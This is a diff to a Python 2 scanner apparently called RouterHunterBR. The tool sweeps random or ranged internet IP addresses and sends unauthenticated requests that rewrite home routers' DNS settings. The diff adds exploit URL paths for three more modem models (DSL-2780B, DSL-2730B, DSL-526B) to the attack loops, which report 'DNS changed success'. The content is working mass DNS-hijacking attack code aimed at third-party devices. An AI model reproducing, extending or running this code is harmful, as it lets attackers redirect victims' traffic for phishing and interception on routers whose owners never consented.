@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
  
 #===============================================================================================================================================
-# Scanner RouterHunterBR v2.0 - InurlBrasil Team - By Jhonathan Davi A.K.A jh00nbr
+# Scanner RouterHunterBR v2.0 - InurlBrasil Team 
 # Tool used to find and perform tests in vulnerable routers on the internet.
 # Facebook: https://fb.com/JhonVipNet
 # Blog: http://blog.inurl.com.br
@@ -77,7 +77,7 @@ def conectar_ip(ip,rt):
                 print "[ + ] " + hour() + bcolors.OKGREEN + "[ ! ] IP: [ " + ip + " ] | DNS1: " + dns1 + " DNS2: " + dns2  + bcolors.ENDC
                 print "[ + ] " + hour() + bcolors.OKGREEN + "[ ! ] Status: DNS changed success" + bcolors.ENDC
                 print "[ + ] " + hour() + bcolors.OKGREEN + "[ ! ] Cod: 200"+ bcolors.ENDC
-                print "[ + ] " + hour() + bcolors.OKGREEN + "[ ! ] Model: Shuttle Tech ADSL Modem-Router 915 WM or DSL_500B"+ bcolors.ENDC
+                #print "[ + ] " + hour() + bcolors.OKGREEN + "[ ! ] Model: Shuttle Tech ADSL Modem-Router 915 WM or DSL_500B"+ bcolors.ENDC
                 print "[ + ] " + hour() + bcolors.OKGREEN + "[ ! ] City:",info_ip(ip) + bcolors.ENDC + "\n"
                 
     except:
@@ -133,8 +133,8 @@ def printIP(ip,route):
 #=============================================================================================================================================== 
 def randIP():
 	ips = random_ip()
-	for route in [shuttle, DLink_2740R, DLink_2640B]:
-		lol = conectar_ip(ips,route)
+	for route in [shuttle, DLink_2740R, DLink_2640B, DSL_2780B, DSL_2730B, DSL_526B]:
+	    conectar_ip(ips,route)
 
 # Funcion ipRange / Reference: http://cmikavac.net/2011/09/11/how-to-generate-an-ip-range-list-in-python/
 #===============================================================================================================================================
@@ -216,6 +216,9 @@ if __name__ == "__main__":
 	# GET vulnerable routers.
 	#===============================================================================================================================================
 	shuttle = "/dnscfg.cgi?dnsPrimary="+dns1+"&dnsSecondary="+dns2+"&dnsDynamic=0&dnsRefresh=1"
+        DSL_2780B = "/dnscfg.cgi?dnsSecondary="+dns2+"&dnsIfcsList=&dnsRefresh=1"
+        DSL_2730B = "/dnscfg.cgi?dnsPrimary="+dns1+"&dnsSecondary="+dns2+"&dnsDynamic=0&dnsRefresh=1&dnsIfcsList="
+        DSL_526B = "/dnscfg.cgi?dnsSecondary="+dns2+"&dnsDynamic=0&dnsRefresh=1"
 	DLink_2740R = "/dns_1?Enable_DNSFollowing=1&dnsPrimary="+dns1+"&dnsSecondary="+dns2
 	DLink_2640B = "/ddnsmngr.cmd?action=apply&service=0&enbl=0&dnsPrimary="+dns1+"&dnsSecondary="+dns2+"&dnsDynamic=0&dnsRefresh=1&dns6Type=DHCP"
 	dns1_explode = dns1.split(".")
@@ -237,7 +240,7 @@ if __name__ == "__main__":
             ip1 = start_rangeip.replace('*', str(0)) 
             ip2 = end_rangeip.replace('*', str(255)) 
             for ip in ipRange_wildcard(ip1,ip2):
-                for route in [shuttle, DLink_2740R, DLink_2640B]:
+                for route in [shuttle, DLink_2740R, DLink_2640B, DSL_2780B, DSL_2730B, DSL_526B]:
 		    lista_threads = []
 		    while threading.active_count() > MAX_CONEXOES:
 		        print("Esperando 1s...")
@@ -272,7 +275,7 @@ if __name__ == "__main__":
                 print banner
                 print "\n\n[*] Testing started in range: [ "+rngip+" ] at [ " + hour()+ " ]\n"
 	        for ips in range_ips(rngip):
-                    for route in [shuttle, DLink_2740R, DLink_2640B]:
+                    for route in [shuttle, DLink_2740R, DLink_2640B, DSL_2780B, DSL_2730B, DSL_526B]:
 		        lista_threads = []
 		        while threading.active_count() > MAX_CONEXOES:
 		            print("Esperando 1s...")
